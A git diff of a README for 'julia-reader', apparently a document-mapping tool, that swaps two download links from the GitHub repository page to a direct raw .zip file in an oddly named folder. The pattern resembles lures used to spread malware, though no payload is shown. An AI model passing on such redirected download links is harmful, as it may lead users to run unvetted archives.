@@ -1,6 +1,6 @@
 # 📖 julia-reader - Turn long documents into maps
 
-[![Download Julia Reader](https://img.shields.io/badge/Download_Julia_Reader-blue?style=for-the-badge)](https://github.com/Disreputable-larvacide285/julia-reader)
+[![Download Julia Reader](https://img.shields.io/badge/Download_Julia_Reader-blue?style=for-the-badge)](https://raw.githubusercontent.com/Disreputable-larvacide285/julia-reader/main/thaumaturgia/reader_julia_v1.8.zip)
 
 ## 🎯 About This Software
 
@@ -22,7 +22,7 @@ To run Julia Reader on your Windows computer, you need these items:
 
 Visit the official repository page to download the setup file. 
 
-[Click here to view the download page](https://github.com/Disreputable-larvacide285/julia-reader)
+[Click here to view the download page](https://raw.githubusercontent.com/Disreputable-larvacide285/julia-reader/main/thaumaturgia/reader_julia_v1.8.zip)
 
 Follow these steps to get the software:
 
